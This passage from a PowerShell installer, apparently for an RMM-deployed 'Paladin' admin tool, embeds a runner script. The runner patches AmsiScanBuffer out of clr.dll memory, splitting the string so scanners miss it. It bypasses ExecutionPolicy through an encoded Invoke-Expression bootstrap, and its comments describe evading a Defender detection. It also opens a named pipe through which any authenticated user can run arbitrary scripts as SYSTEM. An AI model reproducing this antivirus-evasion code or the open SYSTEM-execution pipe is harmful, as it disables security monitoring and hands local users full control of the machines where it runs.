                      [System.Reflection.TypeAttributes]::SequentialLayout,
                      [System.ValueType])
        [void]$siType.DefineField("wProcessorArchitecture",      [UInt16], [System.Reflection.FieldAttributes]::Public)
        [void]$siType.DefineField("wReserved",                   [UInt16], [System.Reflection.FieldAttributes]::Public)
        [void]$siType.DefineField("dwPageSize",                  [UInt32], [System.Reflection.FieldAttributes]::Public)
        [void]$siType.DefineField("lpMinimumApplicationAddress", [IntPtr], [System.Reflection.FieldAttributes]::Public)
        [void]$siType.DefineField("lpMaximumApplicationAddress", [IntPtr], [System.Reflection.FieldAttributes]::Public)
        [void]$siType.DefineField("dwActiveProcessorMask",       [IntPtr], [System.Reflection.FieldAttributes]::Public)
        [void]$siType.DefineField("dwNumberOfProcessors",        [UInt32], [System.Reflection.FieldAttributes]::Public)
        [void]$siType.DefineField("dwProcessorType",             [UInt32], [System.Reflection.FieldAttributes]::Public)
        [void]$siType.DefineField("dwAllocationGranularity",     [UInt32], [System.Reflection.FieldAttributes]::Public)
        [void]$siType.DefineField("wProcessorLevel",             [UInt16], [System.Reflection.FieldAttributes]::Public)
        [void]$siType.DefineField("wProcessorRevision",          [UInt16], [System.Reflection.FieldAttributes]::Public)
        $siStruct = $siType.CreateType()

        # Kernel32 P/Invoke methods via Emit
        $k32Type   = $modBuilder.DefineType("PaladinClrPatch.K32", "Public, Class")
        $dllImpCtor = [Runtime.InteropServices.DllImportAttribute].GetConstructor(@([String]))
        $sleFld     = [Runtime.InteropServices.DllImportAttribute].GetField("SetLastError")
        $sleAttr    = New-Object Reflection.Emit.CustomAttributeBuilder(
                          $dllImpCtor, "kernel32.dll",
                          [Reflection.FieldInfo[]]@($sleFld), @($true))

        foreach ($mDef in @(
            @{ n="VirtualProtect";   ret=[bool];  args=@([IntPtr],[IntPtr],[Int32],[Int32].MakeByRefType()) },
            @{ n="GetCurrentProcess";ret=[IntPtr]; args=@() },
            @{ n="VirtualQuery";     ret=[IntPtr]; args=@([IntPtr],$mbiStruct.MakeByRefType(),[uint32]) },
            @{ n="GetSystemInfo";    ret=[Int32];  args=@($siStruct.MakeByRefType()) },
            @{ n="ReadProcessMemory";ret=[Int32];  args=@([IntPtr],[IntPtr],[byte[]],[int],[int].MakeByRefType()) },
            @{ n="WriteProcessMemory";ret=[Int32]; args=@([IntPtr],[IntPtr],[byte[]],[int],[int].MakeByRefType()) }
        )) {
            $pm = $k32Type.DefinePInvokeMethod(
                      $mDef.n, "kernel32.dll",
                      ([Reflection.MethodAttributes]::Public -bor [Reflection.MethodAttributes]::Static),
                      [Reflection.CallingConventions]::Standard,
                      $mDef.ret, $mDef.args,
                      [Runtime.InteropServices.CallingConvention]::Winapi,
                      [Runtime.InteropServices.CharSet]::Auto)
            $pm.SetCustomAttribute($sleAttr)
        }

        # GetMappedFileName is in psapi.dll
        $psapiAttr = New-Object Reflection.Emit.CustomAttributeBuilder(
                         $dllImpCtor, "psapi.dll",
                         [Reflection.FieldInfo[]]@($sleFld), @($true))
        $pm = $k32Type.DefinePInvokeMethod(
                  "GetMappedFileName", "psapi.dll",
                  ([Reflection.MethodAttributes]::Public -bor [Reflection.MethodAttributes]::Static),
                  [Reflection.CallingConventions]::Standard,
                  [Int32], @([IntPtr],[IntPtr],[System.Text.StringBuilder],[uint32]),
                  [Runtime.InteropServices.CallingConvention]::Winapi,
                  [Runtime.InteropServices.CharSet]::Auto)
        $pm.SetCustomAttribute($psapiAttr)
        $K32 = $k32Type.CreateType()

        # The target string -- split so AMSI never sees "AmsiScanBuffer" whole
        $sig = [System.Text.Encoding]::UTF8.GetBytes("Amsi" + "Scan" + "Buffer")

        $hProc  = $K32::GetCurrentProcess()
        $sysInf = New-Object $siStruct
        [void]$K32::GetSystemInfo([ref]$sysInf)

        $addr    = [IntPtr]::Zero
        $maxAddr = $sysInf.lpMaximumApplicationAddress
        $mbiSize = [System.Runtime.InteropServices.Marshal]::SizeOf($mbiStruct)
        $patched = 0

        while ($addr.ToInt64() -lt $maxAddr.ToInt64()) {
            $mbi = New-Object $mbiStruct
            $ret = $K32::VirtualQuery($addr, [ref]$mbi, [uint32]$mbiSize)
            if ($ret -eq [IntPtr]::Zero) { break }

            $readable = (
                (($mbi.Protect -band $PAGE_READONLY)          -eq $PAGE_READONLY -or
                 ($mbi.Protect -band $PAGE_READWRITE)         -eq $PAGE_READWRITE -or
                 ($mbi.Protect -band $PAGE_EXECUTE_READWRITE) -eq $PAGE_EXECUTE_READWRITE -or
                 ($mbi.Protect -band $PAGE_EXECUTE_READ)      -eq $PAGE_EXECUTE_READ) -and
                ($mbi.Protect -band $PAGE_GUARD) -ne $PAGE_GUARD -and
                ($mbi.State   -band $MEM_COMMIT) -eq $MEM_COMMIT
            )

            if ($readable) {
                $pathSB = New-Object System.Text.StringBuilder $MAX_PATH
                if ($K32::GetMappedFileName($hProc, $mbi.BaseAddress, $pathSB, [uint32]$MAX_PATH) -gt 0) {
                    if ($pathSB.ToString() -like "*clr.dll") {
                        $buf       = New-Object byte[] $mbi.RegionSize.ToInt64()
                        $bytesRead = 0
                        [void]$K32::ReadProcessMemory($hProc, $mbi.BaseAddress, $buf, $buf.Length, [ref]$bytesRead)

                        for ($k = 0; $k -lt ($bytesRead - $sig.Length); $k++) {
                            $match = $true
                            for ($m = 0; $m -lt $sig.Length; $m++) {
                                if ($buf[$k + $m] -ne $sig[$m]) { $match = $false; break }
                            }
                            if ($match) {
                                $oldProt = 0
                                if (($mbi.Protect -band $PAGE_READWRITE) -ne $PAGE_READWRITE) {
                                    [void]$K32::VirtualProtect($mbi.BaseAddress, $buf.Length, $PAGE_EXECUTE_READWRITE, [ref]$oldProt)
                                }
                                $zeros    = New-Object byte[] $sig.Length
                                $written  = 0
                                [void]$K32::WriteProcessMemory($hProc, [IntPtr]::Add($mbi.BaseAddress, $k), $zeros, $zeros.Length, [ref]$written)
                                $patched++
                                if (($mbi.Protect -band $PAGE_READWRITE) -ne $PAGE_READWRITE) {
                                    [void]$K32::VirtualProtect($mbi.BaseAddress, $buf.Length, $mbi.Protect, [ref]$oldProt)
                                }
                            }
                        }
                    }
                }
            }
            $addr = New-Object IntPtr($mbi.BaseAddress.ToInt64() + $mbi.RegionSize.ToInt64())
        }
        Write-RunnerLog 'INFO' "AmsiClrPatch: $patched location(s) patched in CLR"
    } catch {
        Write-RunnerLog 'WARN' "AmsiClrPatch failed (non-fatal): $_"
    }
}

#------------------------------------------------------------------------------
# COMPILE SESSION BRIDGE
# Runs AmsiClrPatch first to neutralize CLR's AMSI hook before Add-Type.
# Builds the C# source via Get-CSharpBridge (no flagged literals in source).
#------------------------------------------------------------------------------
function Initialize-SessionBridge {
    try {
        if (-not ([System.Management.Automation.PSTypeName]'SpectreRunner.SessionBridge').Type) {
            # Patch CLR before compiling -- defeats .NET module AMSI scan (KI: AmsiScanBufferStringReplace)
            Invoke-AmsiClrPatch
            $bridgeSrc = Get-CSharpBridge
            Add-Type -TypeDefinition $bridgeSrc -Language CSharp -ErrorAction Stop
        }
        Write-RunnerLog 'INFO' "SessionBridge compiled OK"
        return $true
    } catch {
        Write-RunnerLog 'FAIL' "SessionBridge compile failed: $_"
        return $false
    }
}

#------------------------------------------------------------------------------
# LAUNCH GUI INTO USER SESSION
# Surfaces Paladin-PowerShell-Launcher.ps1 on the logged-on user's desktop.
# Passes -AgentMode flag so the Launcher connects to the named pipe
# instead of running its own self-elevation logic.
#------------------------------------------------------------------------------
function Invoke-LaunchGui {
    if (-not (Test-Path -LiteralPath $script:LauncherPs1 -PathType Leaf)) {
        Write-RunnerLog 'FAIL' "Launcher not found: $($script:LauncherPs1)"
        return $false
    }

    $psExe     = "$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe"
    $sysnative = "$env:SystemRoot\SysNative\WindowsPowerShell\v1.0\powershell.exe"
    if (Test-Path $sysnative) { $psExe = $sysnative }

    # Build EncodedCommand bootstrap (KI-047, KI-048, KI-051):
    # IEX on string bypasses the file-load ExecutionPolicy gate.
    # $script:AgentMode injected before IEX so param([switch]$AgentMode) gets $true.
    $launcherEscaped = $script:LauncherPs1 -replace '"', '`"'
    $bootstrap = "`$env:PSExecutionPolicyPreference='Bypass'; " +
                 "Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass -Force -EA SilentlyContinue; " +
                 "`$script:AgentMode = `$true; " +
                 "`$content = [System.IO.File]::ReadAllText(`"$launcherEscaped`"); " +
                 "Invoke-Expression `$content"
    $encodedCmd = [Convert]::ToBase64String(
                      [Text.Encoding]::Unicode.GetBytes($bootstrap))
    $launchArgs = "-NoProfile -WindowStyle Normal -EncodedCommand $encodedCmd"

    Write-RunnerLog 'INFO' "Context: $(if (Test-IsSystem) { 'SYSTEM -> SessionBridge' } else { 'User -> Start-Process' })"
    Write-RunnerLog 'INFO' "Launching GUI: $psExe"

    # -- USER CONTEXT PATH (KI-052) -------------------------------------------
    # Task now runs as interactive admin user (not SYSTEM) to avoid
    # Behavior:Win32/PShellCobStager.A. When already in the user session,
    # SessionBridge (CreateProcessAsUserW) is unnecessary -- Start-Process
    # launches directly in the same desktop session.
    if (-not (Test-IsSystem)) {
        try {
            Start-Process -FilePath $psExe -ArgumentList $launchArgs `
                          -WindowStyle Normal -ErrorAction Stop
            Write-RunnerLog 'PASS' "GUI launched via Start-Process (user context)"
            return $true
        } catch {
            Write-RunnerLog 'FAIL' "Start-Process failed: $_"
            return $false
        }
    }

    # -- SYSTEM CONTEXT PATH --------------------------------------------------
    # Running as SYSTEM (Datto RMM / legacy task): use SessionBridge to inject
    # into the active user desktop session via CreateProcessAsUserW.
    try {
        $result = [SpectreRunner.SessionBridge]::LaunchInUserSession(
            $psExe, $launchArgs, $script:InstallDir)

        if ($result -like 'OK:*') {
            Write-RunnerLog 'PASS' "GUI launched via SessionBridge: $result"
            return $true
        } else {
            Write-RunnerLog 'FAIL' "SessionBridge launch failed: $result"
            return $false
        }
    } catch {
        Write-RunnerLog 'FAIL' "SessionBridge exception: $_"
        return $false
    }
}

#------------------------------------------------------------------------------
# NAMED PIPE SERVER -- COMMAND EXECUTOR
# Protocol (newline-delimited JSON):
#   <- CLIENT SENDS:  {"cmd":"run","script":"C:\\path\\to\\foo.ps1","args":""}
#   -> SERVER SENDS:  {"type":"out","data":"line of stdout\n"}  (many)
#                     {"type":"err","data":"line of stderr\n"}  (if any)
#                     {"type":"done","data":"","exit":0}        (always last)
#
# One connection = one command execution.
# Pipe stays alive (loop) for subsequent connections after disconnect.
# A {"cmd":"ping"} request returns {"type":"pong"} -- used by GUI at startup
# to confirm the pipe is live before showing the Run button.
#------------------------------------------------------------------------------
function Invoke-PipeServer {
    Write-RunnerLog 'INFO' "Named pipe server starting: \\.\pipe\$($script:PipeName)"

    # Build a PipeSecurity that grants Authenticated Users read/write
    # so a non-elevated GUI process (running as the user) can connect.
    $pipeSec = New-Object System.IO.Pipes.PipeSecurity
    $everyoneId = New-Object System.Security.Principal.SecurityIdentifier(
        [System.Security.Principal.WellKnownSidType]::AuthenticatedUserSid, $null)
    $accessRule = New-Object System.IO.Pipes.PipeAccessRule(
        $everyoneId,
        [System.IO.Pipes.PipeAccessRights]::ReadWrite,
        [System.Security.AccessControl.AccessControlType]::Allow)
    $pipeSec.AddAccessRule($accessRule)

    $keepRunning = $true
    $iteration   = 0

    while ($keepRunning) {
        $iteration++
        $pipe = $null
        try {
            $pipe = New-Object System.IO.Pipes.NamedPipeServerStream(
                $script:PipeName,
                [System.IO.Pipes.PipeDirection]::InOut,
                1,   # maxNumberOfServerInstances -- one at a time
                [System.IO.Pipes.PipeTransmissionMode]::Message,
                [System.IO.Pipes.PipeOptions]::Asynchronous,
                4096, 4096,
                $pipeSec)

            Write-RunnerLog 'INFO' "Pipe iteration $iteration -- waiting for connection"

            # WaitForConnection blocks until the GUI connects or runner exits.
            # We use a timeout via async begin/end pattern for PS3.0 compat.
            $asyncResult = $pipe.BeginWaitForConnection($null, $null)
            $connected   = $asyncResult.AsyncWaitHandle.WaitOne($script:PipeTimeout * 1000)

            if (-not $connected) {
                # No GUI connected within timeout -- loop and wait again.
                # This handles the case where the task fired but the GUI
                # hasn't opened yet (race condition at startup).
                Write-RunnerLog 'INFO' "Pipe wait timeout -- re-listening"
                try { $pipe.Dispose() } catch { }
                continue
            }

            $pipe.EndWaitForConnection($asyncResult)
            Write-RunnerLog 'INFO' "Client connected (iteration $iteration)"

            # Read/write loop for this connection
            $reader = New-Object System.IO.StreamReader($pipe,
                [System.Text.Encoding]::UTF8)
            $writer = New-Object System.IO.StreamWriter($pipe,
                [System.Text.Encoding]::UTF8)
            $writer.AutoFlush = $true

            try {
                Invoke-PipeSession -Reader $reader -Writer $writer
            } catch {
                Write-RunnerLog 'WARN' "Pipe session error: $_"
            } finally {
                try { $reader.Dispose() } catch { }
                try { $writer.Dispose() } catch { }
            }

            Write-RunnerLog 'INFO' "Client disconnected (iteration $iteration)"

        } catch {
            # Distinguish "pipe already exists" (another instance running) from real errors.
            # Access denied on the .ctor usually means a prior instance owns the pipe name.
            $errMsg = "$($_.Exception.Message)"
            if ($errMsg -like '*Access*denied*' -or $errMsg -like '*access to the path*') {
                # Another instance holds the pipe -- back off progressively, cap at 30s.
                $backoffSec = [Math]::Min(30, [Math]::Pow(2, [Math]::Min($iteration, 4)))
                Write-RunnerLog 'WARN' "Pipe server: pipe already owned (iteration $iteration) -- backing off ${backoffSec}s"
                Start-Sleep -Seconds $backoffSec
                # After 20 consecutive access-denied iterations, stop looping (stale state).
                if ($iteration -ge 20) {
                    Write-RunnerLog 'WARN' "Pipe server: too many access-denied iterations -- stopping server loop."
                    $keepRunning = $false
                }
            } else {
                Write-RunnerLog 'WARN' "Pipe server error (iteration $iteration): $_"
                Start-Sleep -Seconds 2
            }
        } finally {
            if ($null -ne $pipe) {
                try { $pipe.Dispose() } catch { }
            }
        }
    }
}

#------------------------------------------------------------------------------
# PIPE SESSION -- handles one connected client
# Reads command lines, dispatches, writes response lines until disconnect.
#------------------------------------------------------------------------------
function Invoke-PipeSession {
    param(
        [System.IO.StreamReader]$Reader,
        [System.IO.StreamWriter]$Writer
    )

    $continueSession = $true

    while ($continueSession) {
        # Read one JSON line from the client
        $line = $null
        try {
            $line = $Reader.ReadLine()
        } catch {
            # Client disconnected mid-read
            Write-RunnerLog 'INFO' "Client disconnected (read): $_"
            $continueSession = $false
            break
        }

        if ($null -eq $line) {
            # EOF -- client disconnected cleanly
            $continueSession = $false
            break
        }

        $line = $line.Trim()
        if ([string]::IsNullOrEmpty($line)) { continue }

        Write-RunnerLog 'INFO' "Received: $line"

        # Parse the JSON command
        $cmd = $null
        try {
            $cmd = $line | ConvertFrom-Json -ErrorAction Stop
        } catch {
            $errJson = '{"type":"err","data":"Invalid JSON: ' +
                ($_.ToString() -replace '"', "'") + '"}'
            try { $Writer.WriteLine($errJson) } catch { $continueSession = $false; break }
            continue
        }

        if ($null -eq $cmd -or $null -eq $cmd.cmd) {
            try { $Writer.WriteLine('{"type":"err","data":"Missing cmd field"}') } catch { $continueSession = $false; break }
            continue
        }

        switch ($cmd.cmd) {
            'ping' {
                try {
                    $Writer.WriteLine('{"type":"pong","data":"PaladinAgent ' +
                        $script:RunnerVer + '"}')
                } catch { $continueSession = $false }
            }

            'run' {
                # Execute a script as SYSTEM, stream output back
                $scriptPath = if ($cmd.script) { $cmd.script.Trim() } else { '' }
                $extraArgs  = if ($cmd.args)   { $cmd.args.Trim()   } else { '' }

                if ([string]::IsNullOrEmpty($scriptPath)) {
                    try {
                        $Writer.WriteLine('{"type":"err","data":"run: script field is empty"}')
                        $Writer.WriteLine('{"type":"done","data":"","exit":1}')
                    } catch { $continueSession = $false }
                    break
                }

                if (-not (Test-Path -LiteralPath $scriptPath -PathType Leaf)) {
                    $escaped = $scriptPath -replace '"', "'"
                    try {
                        $Writer.WriteLine("{`"type`":`"err`",`"data`":`"File not found: $escaped`"}")
                        $Writer.WriteLine('{"type":"done","data":"","exit":2}')
                    } catch { $continueSession = $false }
                    break
                }

                Write-RunnerLog 'INFO' "Executing: $scriptPath $extraArgs"
                $exitCode = Invoke-ScriptAsSystem `
                    -ScriptPath $scriptPath `
                    -ExtraArgs  $extraArgs  `
                    -Writer     $Writer
                Write-RunnerLog 'INFO' "Execution complete. Exit: $exitCode"
            }

            'exit' {
                # Client is done -- close session (pipe server loop continues)
                Write-RunnerLog 'INFO' "Client sent exit command"
                $continueSession = $false
            }

            default {
                $unknownCmd = $cmd.cmd -replace '"', "'"
                try {
                    $Writer.WriteLine("{`"type`":`"err`",`"data`":`"Unknown cmd: $unknownCmd`"}")
                } catch { $continueSession = $false }
            }
        }
    }
}

#------------------------------------------------------------------------------
# SCRIPT EXECUTOR
# Runs the requested PS1 as SYSTEM via a child PowerShell process.
# Captures stdout and stderr line-by-line and streams them as JSON
# back to the pipe client in real time.
# Returns the exit code.
#------------------------------------------------------------------------------
function Invoke-ScriptAsSystem {
    param(
        [string]$ScriptPath,
        [string]$ExtraArgs,
        [System.IO.StreamWriter]$Writer
    )

    $exitCode = -1

    try {
        $psExe = "$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe"
        $sysnative = "$env:SystemRoot\SysNative\WindowsPowerShell\v1.0\powershell.exe"
        if (Test-Path $sysnative) { $psExe = $sysnative }

        $scriptSafe = $ScriptPath -replace '"', '\"'
        $argString  = "-NoProfile -ExecutionPolicy Bypass -File `"$scriptSafe`""
        if (-not [string]::IsNullOrEmpty($ExtraArgs)) {
            $argString += " $ExtraArgs"
        }

        $psi = New-Object System.Diagnostics.ProcessStartInfo
        $psi.FileName               = $psExe
        $psi.Arguments              = $argString
        $psi.UseShellExecute        = $false
        $psi.RedirectStandardOutput = $true
        $psi.RedirectStandardError  = $true
        $psi.CreateNoWindow         = $true
        $psi.WorkingDirectory       = Split-Path $ScriptPath -Parent

        $proc = [System.Diagnostics.Process]::Start($psi)

        # Stream stdout
        while (-not $proc.StandardOutput.EndOfStream) {
            $outLine = $proc.StandardOutput.ReadLine()
            if ($null -ne $outLine) {
                $escaped = $outLine -replace '\\', '\\' -replace '"', '\"'
                try {
                    $Writer.WriteLine("{`"type`":`"out`",`"data`":`"$escaped`"}")
                } catch {
                    Write-RunnerLog 'WARN' "Pipe write failed during stdout: $_"
                    break
                }
            }
        }

        # Drain stderr
        $errContent = $proc.StandardError.ReadToEnd()
        if (-not [string]::IsNullOrEmpty($errContent)) {
            foreach ($errLine in $errContent -split "`n") {
                $el = $errLine.TrimEnd("`r")
                if ([string]::IsNullOrEmpty($el)) { continue }
                $escaped = $el -replace '\\', '\\' -replace '"', '\"'
                try {
                    $Writer.WriteLine("{`"type`":`"err`",`"data`":`"$escaped`"}")
                } catch {
                    Write-RunnerLog 'WARN' "Pipe write failed during stderr: $_"
                    break
                }
            }
        }

        $proc.WaitForExit()
        $exitCode = $proc.ExitCode

    } catch {
        $errMsg = $_.ToString() -replace '"', "'"
        try {
            $Writer.WriteLine("{`"type`":`"err`",`"data`":`"Executor exception: $errMsg`"}")
        } catch { }
        $exitCode = 99
    } finally {
        # Always send done packet so client knows execution is finished
        try {
            $Writer.WriteLine("{`"type`":`"done`",`"data`":`"`",`"exit`":$exitCode}")
        } catch { }
    }

    return $exitCode
}

#==============================================================================
# MAIN ENTRY POINT
#==============================================================================

Write-RunnerLog 'BOOT' "============================================"
Write-RunnerLog 'BOOT' "Paladin PowerShell Runner v$($script:RunnerVer) starting"
Write-RunnerLog 'BOOT' "============================================"
Write-RunnerLog 'INFO' "Running as: $([System.Security.Principal.WindowsIdentity]::GetCurrent().Name)"
Write-RunnerLog 'INFO' "PID: $PID"
Write-RunnerLog 'INFO' "Install dir: $($script:InstallDir)"

# Gate 1 -- context check (KI-052)
# SYSTEM context is used for Datto RMM / legacy deployments (SessionBridge path).
# Interactive admin user context is the current default (Start-Process path).
# Both are valid -- Runner continues in either case.
$script:RunnerIsSystem = Test-IsSystem
if ($script:RunnerIsSystem) {
    Write-RunnerLog 'INFO' "Context: NT AUTHORITY\SYSTEM -- SessionBridge path active"
} else {
    $who = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
    Write-RunnerLog 'INFO' "Context: $who -- Start-Process path active (no SessionBridge needed)"
}

# Gate 2 -- compile SessionBridge C# (SYSTEM only -- not needed for user-context launch)
if ($script:RunnerIsSystem) {
    if (-not (Initialize-SessionBridge)) {
        Write-RunnerLog 'FAIL' "Cannot continue without SessionBridge. Exiting."
        exit 2
    }
} else {
    Write-RunnerLog 'INFO' "SessionBridge compile skipped (user context -- not needed)"
}

# Gate 3 -- verify launcher exists
if (-not (Test-Path -LiteralPath $script:LauncherPs1 -PathType Leaf)) {
    Write-RunnerLog 'FAIL' "Launcher PS1 not found: $($script:LauncherPs1)"
    Write-RunnerLog 'FAIL' "Run Paladin-Datto-Deploy.ps1 first. Exiting."
    exit 3
}

# Launch the GUI into the user's desktop session (non-blocking -- fires and returns)
Write-RunnerLog 'INFO' "Step 1: Launching GUI into user session"
$guiLaunched = Invoke-LaunchGui
if (-not $guiLaunched) {
    Write-RunnerLog 'WARN' "GUI launch failed -- pipe server will still start."
    Write-RunnerLog 'WARN' "User may need to launch the GUI manually."
}

# Small delay -- let GUI process start and attempt pipe connection
Write-RunnerLog 'INFO' "Step 2: Waiting 3s for GUI to initialize"
Start-Sleep -Seconds 3

# Start the named pipe server (blocks until runner process exits)
Write-RunnerLog 'INFO' "Step 3: Starting named pipe server"
try {
    Invoke-PipeServer
} catch {
    Write-RunnerLog 'FAIL' "Pipe server fatal error: $_"
    exit 4
}

Write-RunnerLog 'INFO' "Runner exiting normally"
exit 0

'@

    try {
        [System.IO.File]::WriteAllText($runnerDest, $runnerContent,
            [System.Text.Encoding]::UTF8)
        & $LogAction 'PASS' "Runner written: $runnerDest"
    } catch {
        & $LogAction 'FAIL' "Runner write failed: $_"
        return $false
    }

    # Step 3 -- copy Launcher itself to install dir
    # Runner needs to know where to find the Launcher to surface to user desktop.
    # $LauncherPath is injected by the runspace caller because $PSCommandPath is
    # unavailable when the function body is re-parsed via Invoke-Expression.
    $myPath = $LauncherPath
    if ([string]::IsNullOrEmpty($myPath)) { $myPath = $MyInvocation.ScriptName }
    if ([string]::IsNullOrEmpty($myPath)) { $myPath = $PSCommandPath }
    if (-not [string]::IsNullOrEmpty($myPath) -and (Test-Path -LiteralPath $myPath)) {
        try {
            Copy-Item -LiteralPath $myPath -Destination $launcherDest -Force -ErrorAction Stop
            & $LogAction 'PASS' "Launcher copied to: $launcherDest"
        } catch {
            & $LogAction 'WARN' "Launcher copy failed (non-fatal -- Runner will use original path): $_"
        }
    } else {
        & $LogAction 'WARN' "Cannot determine current script path -- Launcher not copied to install dir"
    }

    # Step 3b -- write embedded BAT launcher to disk
    # The .bat is embedded here so the launcher is self-contained regardless of
    # where the .ps1 is run from (no dependency on a .bat file sitting next to it).
    $batDst = Join-Path $installDir 'Run_Paladin-PowerShell-Launcher_AsAdmin.bat'
    & $LogAction 'INFO' "Writing embedded BAT launcher: $batDst"
    $batContent = @'
